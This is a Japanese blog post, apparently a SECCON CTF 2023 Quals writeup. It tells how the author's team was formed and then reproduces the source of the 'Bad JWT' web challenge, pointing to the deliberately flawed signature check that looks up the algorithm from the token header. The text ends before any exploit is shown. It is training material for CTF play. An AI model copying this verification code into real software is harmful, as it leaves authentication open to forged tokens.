<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>SECCON CTF 2023 Quals writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="はじめに 2023-09-16 05:00 UTC - 2023-09-17 05:00 UTC でSECCON CTF 2023 Qualsが開催されました。
チームONsenで参加し、国際90/653位、国内37/334位でした。
僕はWebのwarmup問題であるBad JWTを解いたのみで、その他のweb問題に全く歯が立たずにベンチを温めていました。
参加にあたって チームONsenは僕の研究室の後輩であるY君が阪大在籍時に「打倒！W◯ni Hack○se！」をスローガンに設立したチームであり（嘘）、阪大とNAISTの学生が所属しています。自分もONsenに所属しており、Y君が後ろの席で「SECCON予選でW◯ni Hack○se倒してえなあ」と毎日口ずさんでおり（嘘）、恐怖を感じたため、チームメンバーの補強を企んでいました。
すると、自分が普段からツイートやブログを拝見しているつよつよCTFプレイヤーであるhamayanさんが参加するチームを探しているではありませんか。
SECCONチーム入れてくれる心優しい人いませんか
&mdash; hamayanhamayan (@hamayanhamayan) September 4, 2023 「これは、チャンス！」と思ったので、速攻勧誘させてもらいました。すると、まさかのOKをいただき、hamayanさんがONsenでSECCON予選に参加してくださることが確定しました。
追加でNAIST最強のpwner()であるおしぼりをONsenに加入させることに成功しました。
これでSECCON予選での僕の仕事は終わったと言えます。当日はベンチを温められることが確定しました。
[web] Bad JWT SatoooonさんのJWT問です。
jwt.js
const crypto = require('crypto'); const base64UrlEncode = (str) => { return Buffer.from(str) .toString('base64') .replace(/=*$/g, '') .replace(/\+/g, '-') .replace(/\//g, '_'); } const base64UrlDecode = (str) => { return Buffer.from(str, 'base64').toString(); } const algorithms = { hs256: (data, secret) => base64UrlEncode(crypto."><meta property="og:image" content><meta property="og:title" content="SECCON CTF 2023 Quals writeup"><meta property="og:description" content="はじめに 2023-09-16 05:00 UTC - 2023-09-17 05:00 UTC でSECCON CTF 2023 Qualsが開催されました。
チームONsenで参加し、国際90/653位、国内37/334位でした。
僕はWebのwarmup問題であるBad JWTを解いたのみで、その他のweb問題に全く歯が立たずにベンチを温めていました。
参加にあたって チームONsenは僕の研究室の後輩であるY君が阪大在籍時に「打倒！W◯ni Hack○se！」をスローガンに設立したチームであり（嘘）、阪大とNAISTの学生が所属しています。自分もONsenに所属しており、Y君が後ろの席で「SECCON予選でW◯ni Hack○se倒してえなあ」と毎日口ずさんでおり（嘘）、恐怖を感じたため、チームメンバーの補強を企んでいました。
すると、自分が普段からツイートやブログを拝見しているつよつよCTFプレイヤーであるhamayanさんが参加するチームを探しているではありませんか。
SECCONチーム入れてくれる心優しい人いませんか
&mdash; hamayanhamayan (@hamayanhamayan) September 4, 2023 「これは、チャンス！」と思ったので、速攻勧誘させてもらいました。すると、まさかのOKをいただき、hamayanさんがONsenでSECCON予選に参加してくださることが確定しました。
追加でNAIST最強のpwner()であるおしぼりをONsenに加入させることに成功しました。
これでSECCON予選での僕の仕事は終わったと言えます。当日はベンチを温められることが確定しました。
[web] Bad JWT SatoooonさんのJWT問です。
jwt.js
const crypto = require('crypto'); const base64UrlEncode = (str) => { return Buffer.from(str) .toString('base64') .replace(/=*$/g, '') .replace(/\+/g, '-') .replace(/\//g, '_'); } const base64UrlDecode = (str) => { return Buffer.from(str, 'base64').toString(); } const algorithms = { hs256: (data, secret) => base64UrlEncode(crypto."><meta property="og:type" content="article"><meta property="og:url" content="/posts/40/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-17T23:03:10+09:00"><meta property="article:modified_time" content="2023-09-17T23:03:10+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="SECCON CTF 2023 Quals writeup"><meta name=twitter:description content="はじめに 2023-09-16 05:00 UTC - 2023-09-17 05:00 UTC でSECCON CTF 2023 Qualsが開催されました。
チームONsenで参加し、国際90/653位、国内37/334位でした。
僕はWebのwarmup問題であるBad JWTを解いたのみで、その他のweb問題に全く歯が立たずにベンチを温めていました。
参加にあたって チームONsenは僕の研究室の後輩であるY君が阪大在籍時に「打倒！W◯ni Hack○se！」をスローガンに設立したチームであり（嘘）、阪大とNAISTの学生が所属しています。自分もONsenに所属しており、Y君が後ろの席で「SECCON予選でW◯ni Hack○se倒してえなあ」と毎日口ずさんでおり（嘘）、恐怖を感じたため、チームメンバーの補強を企んでいました。
すると、自分が普段からツイートやブログを拝見しているつよつよCTFプレイヤーであるhamayanさんが参加するチームを探しているではありませんか。
SECCONチーム入れてくれる心優しい人いませんか
&mdash; hamayanhamayan (@hamayanhamayan) September 4, 2023 「これは、チャンス！」と思ったので、速攻勧誘させてもらいました。すると、まさかのOKをいただき、hamayanさんがONsenでSECCON予選に参加してくださることが確定しました。
追加でNAIST最強のpwner()であるおしぼりをONsenに加入させることに成功しました。
これでSECCON予選での僕の仕事は終わったと言えます。当日はベンチを温められることが確定しました。
[web] Bad JWT SatoooonさんのJWT問です。
jwt.js
const crypto = require('crypto'); const base64UrlEncode = (str) => { return Buffer.from(str) .toString('base64') .replace(/=*$/g, '') .replace(/\+/g, '-') .replace(/\//g, '_'); } const base64UrlDecode = (str) => { return Buffer.from(str, 'base64').toString(); } const algorithms = { hs256: (data, secret) => base64UrlEncode(crypto."><script src=/js/feather.min.js></script>
<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
<a href=/posts>Posts</a>
<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>SECCON CTF 2023 Quals writeup</h1><div class=meta>Posted on Sep 17, 2023</div></div><nav id=TableOfContents><ol><li><a href=#はじめに>はじめに</a></li><li><a href=#参加にあたって>参加にあたって</a></li><li><a href=#web-bad-jwt>[web] Bad JWT</a></li><li><a href=#おわりに>おわりに</a></li></ol></nav><section class=body><h1 id=はじめに>はじめに</h1><p>2023-09-16 05:00 UTC - 2023-09-17 05:00 UTC でSECCON CTF 2023 Qualsが開催されました。</p><p>チームONsenで参加し、国際90/653位、国内37/334位でした。</p><p><img src=/images/posts/40/score.png alt=score></p><p>僕はWebのwarmup問題であるBad JWTを解いたのみで、その他のweb問題に全く歯が立たずにベンチを温めていました。</p><h1 id=参加にあたって>参加にあたって</h1><p>チームONsenは僕の研究室の後輩であるY君が阪大在籍時に「打倒！W◯ni Hack○se！」をスローガンに設立したチームであり（嘘）、阪大とNAISTの学生が所属しています。自分もONsenに所属しており、Y君が後ろの席で「SECCON予選でW◯ni Hack○se倒してえなあ」と毎日口ずさんでおり（嘘）、恐怖を感じたため、チームメンバーの補強を企んでいました。</p><p>すると、自分が普段からツイートやブログを拝見しているつよつよCTFプレイヤーである<a href=https://twitter.com/hamayanhamayan>hamayanさん</a>が参加するチームを探しているではありませんか。</p><blockquote class=twitter-tweet><p lang=ja dir=ltr>SECCONチーム入れてくれる心優しい人いませんか</p>&mdash; hamayanhamayan (@hamayanhamayan) <a href="https://twitter.com/hamayanhamayan/status/1698672469790622123?ref_src=twsrc%5Etfw">September 4, 2023</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p>「これは、チャンス！」と思ったので、速攻勧誘させてもらいました。すると、まさかのOKをいただき、hamayanさんがONsenでSECCON予選に参加してくださることが確定しました。</p><p>追加でNAIST最強のpwner()である<a href=https://twitter.com/oshiborii>おしぼり</a>をONsenに加入させることに成功しました。</p><p>これでSECCON予選での僕の仕事は終わったと言えます。当日はベンチを温められることが確定しました。</p><h1 id=web-bad-jwt>[web] Bad JWT</h1><p>SatoooonさんのJWT問です。</p><p><code>jwt.js</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>crypto</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;crypto&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>base64UrlEncode</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>str</span>) =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>from</span>(<span style=color:#a6e22e>str</span>)
</span></span><span style=display:flex><span>		.<span style=color:#a6e22e>toString</span>(<span style=color:#e6db74>&#39;base64&#39;</span>)
</span></span><span style=display:flex><span>		.<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>/=*$/g</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>		.<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>/\+/g</span>, <span style=color:#e6db74>&#39;-&#39;</span>)
</span></span><span style=display:flex><span>		.<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>/\//g</span>, <span style=color:#e6db74>&#39;_&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>base64UrlDecode</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>str</span>) =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>from</span>(<span style=color:#a6e22e>str</span>, <span style=color:#e6db74>&#39;base64&#39;</span>).<span style=color:#a6e22e>toString</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>algorithms</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>hs256</span><span style=color:#f92672>:</span> (<span style=color:#a6e22e>data</span>, <span style=color:#a6e22e>secret</span>) =&gt; 
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>base64UrlEncode</span>(<span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>createHmac</span>(<span style=color:#e6db74>&#39;sha256&#39;</span>, <span style=color:#a6e22e>secret</span>).<span style=color:#a6e22e>update</span>(<span style=color:#a6e22e>data</span>).<span style=color:#a6e22e>digest</span>()),
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>hs512</span><span style=color:#f92672>:</span> (<span style=color:#a6e22e>data</span>, <span style=color:#a6e22e>secret</span>) =&gt; 
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>base64UrlEncode</span>(<span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>createHmac</span>(<span style=color:#e6db74>&#39;sha512&#39;</span>, <span style=color:#a6e22e>secret</span>).<span style=color:#a6e22e>update</span>(<span style=color:#a6e22e>data</span>).<span style=color:#a6e22e>digest</span>()),
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>stringifyPart</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>obj</span>) =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>base64UrlEncode</span>(<span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>(<span style=color:#a6e22e>obj</span>));
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>parsePart</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>str</span>) =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>parse</span>(<span style=color:#a6e22e>base64UrlDecode</span>(<span style=color:#a6e22e>str</span>));
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>createSignature</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>header</span>, <span style=color:#a6e22e>payload</span>, <span style=color:#a6e22e>secret</span>) =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>stringifyPart</span>(<span style=color:#a6e22e>header</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>stringifyPart</span>(<span style=color:#a6e22e>payload</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>signature</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>algorithms</span>[<span style=color:#a6e22e>header</span>.<span style=color:#a6e22e>alg</span>.<span style=color:#a6e22e>toLowerCase</span>()](<span style=color:#a6e22e>data</span>, <span style=color:#a6e22e>secret</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>signature</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>parseToken</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>token</span>) =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>parts</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>token</span>.<span style=color:#a6e22e>split</span>(<span style=color:#e6db74>&#39;.&#39;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>parts</span>.<span style=color:#a6e22e>length</span> <span style=color:#f92672>!==</span> <span style=color:#ae81ff>3</span>) <span style=color:#66d9ef>throw</span> Error(<span style=color:#e6db74>&#39;Invalid JWT format&#39;</span>);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> [ <span style=color:#a6e22e>header</span>, <span style=color:#a6e22e>payload</span>, <span style=color:#a6e22e>signature</span> ] <span style=color:#f92672>=</span> <span style=color:#a6e22e>parts</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>parsedHeader</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>parsePart</span>(<span style=color:#a6e22e>header</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>parsedPayload</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>parsePart</span>(<span style=color:#a6e22e>payload</span>);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> { <span style=color:#a6e22e>header</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>parsedHeader</span>, <span style=color:#a6e22e>payload</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>parsedPayload</span>, <span style=color:#a6e22e>signature</span> }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>sign</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>alg</span>, <span style=color:#a6e22e>payload</span>, <span style=color:#a6e22e>secret</span>) =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>header</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>typ</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;JWT&#39;</span>,
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>alg</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>alg</span>
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>signature</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>createSignature</span>(<span style=color:#a6e22e>header</span>, <span style=color:#a6e22e>payload</span>, <span style=color:#a6e22e>secret</span>);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>stringifyPart</span>(<span style=color:#a6e22e>header</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>stringifyPart</span>(<span style=color:#a6e22e>payload</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>signature</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>token</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>verify</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>token</span>, <span style=color:#a6e22e>secret</span>) =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>header</span>, <span style=color:#a6e22e>payload</span>, <span style=color:#a6e22e>signature</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>expected_signature</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>parseToken</span>(<span style=color:#a6e22e>token</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>calculated_signature</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>createSignature</span>(<span style=color:#a6e22e>header</span>, <span style=color:#a6e22e>payload</span>, <span style=color:#a6e22e>secret</span>);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>calculated_buf</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>from</span>(<span style=color:#a6e22e>calculated_signature</span>, <span style=color:#e6db74>&#39;base64&#39;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>expected_buf</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>from</span>(<span style=color:#a6e22e>expected_signature</span>, <span style=color:#e6db74>&#39;base64&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>compare</span>(<span style=color:#a6e22e>calculated_buf</span>, <span style=color:#a6e22e>expected_buf</span>) <span style=color:#f92672>!==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>throw</span> Error(<span style=color:#e6db74>&#39;Invalid signature&#39;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>payload</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>module</span>.<span style=color:#a6e22e>exports</span> <span style=color:#f92672>=</span> { <span style=color:#a6e22e>sign</span>, <span style=color:#a6e22e>verify</span> }
</span></span></code></pre></div><p><code>index.js</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>FLAG</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>FLAG</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;SECCON{dummy}&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>PORT</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;3000&#39;</span>;;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;express&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>cookieParser</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;cookie-parser&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>jwt</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;./jwt&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>();
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>express</span>.<span style=color:#a6e22e>urlencoded</span>({ <span style=color:#a6e22e>extended</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span> }));
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>cookieParser</span>());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>secret</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;crypto&#39;</span>).<span style=color:#a6e22e>randomBytes</span>(<span style=color:#ae81ff>32</span>).<span style=color:#a6e22e>toString</span>(<span style=color:#e6db74>&#39;hex&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>((<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>, <span style=color:#a6e22e>next</span>) =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>cookies</span>.<span style=color:#a6e22e>session</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>payload</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>verify</span>(<span style=color:#a6e22e>token</span>, <span style=color:#a6e22e>secret</span>);
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>session</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>payload</span>;
</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>e</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>e</span>);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;Authentication failed&#39;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>next</span>();
</span></span><span style=display:flex><span>})
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/&#39;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>session</span>.<span style=color:#a6e22e>isAdmin</span> <span style=color:#f92672>===</span> <span style=color:#66d9ef>true</span>) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>FLAG</span>);
</span></span><span style=display:flex><span>	} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>().<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#39;You are not admin!&#39;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#a6e22e>PORT</span>, () =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>admin_session</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>sign</span>(<span style=color:#e6db74>&#39;HS512&#39;</span>, { <span style=color:#a6e22e>isAdmin</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span> }, <span style=color:#a6e22e>secret</span>);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`[INFO] Use </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>admin_session</span><span style=color:#e6db74>}</span><span style=color:#e6db74> as session cookie`</span>);
</span></span><span style=display:flex><span>   <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`Challenge server listening on port </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>PORT</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>ペイロード<code>{isAdmin:true}</code>であり、署名が有効なJWTを送信することでflagが得られます。秘密鍵を直接求めることはできないため、署名検証をバイパスすることを考えます。</p><p>ここで、署名検証時に使用される<code>createSignature</code>関数及び<code>algorithms</code>オブジェクトに着目します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>algorithms</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>hs256</span><span style=color:#f92672>:</span> (<span style=color:#a6e22e>data</span>, <span style=color:#a6e22e>secret</span>) =&gt; 
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>base64UrlEncode</span>(<span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>createHmac</span>(<span style=color:#e6db74>&#39;sha256&#39;</span>, <span style=color:#a6e22e>secret</span>).<span style=color:#a6e22e>update</span>(<span style=color:#a6e22e>data</span>).<span style=color:#a6e22e>digest</span>()),
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>hs512</span><span style=color:#f92672>:</span> (<span style=color:#a6e22e>data</span>, <span style=color:#a6e22e>secret</span>) =&gt; 
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>base64UrlEncode</span>(<span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>createHmac</span>(<span style=color:#e6db74>&#39;sha512&#39;</span>, <span style=color:#a6e22e>secret</span>).<span style=color:#a6e22e>update</span>(<span style=color:#a6e22e>data</span>).<span style=color:#a6e22e>digest</span>()),
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>createSignature</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>header</span>, <span style=color:#a6e22e>payload</span>, <span style=color:#a6e22e>secret</span>) =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>stringifyPart</span>(<span style=color:#a6e22e>header</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>stringifyPart</span>(<span style=color:#a6e22e>payload</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>signature</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>algorithms</span>[<span style=color:#a6e22e>header</span>.<span style=color:#a6e22e>alg</span>.<span style=color:#a6e22e>toLowerCase</span>()](<span style=color:#a6e22e>data</span>, <span style=color:#a6e22e>secret</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>signature</span>;
</span></span><span style=display:flex><span>}
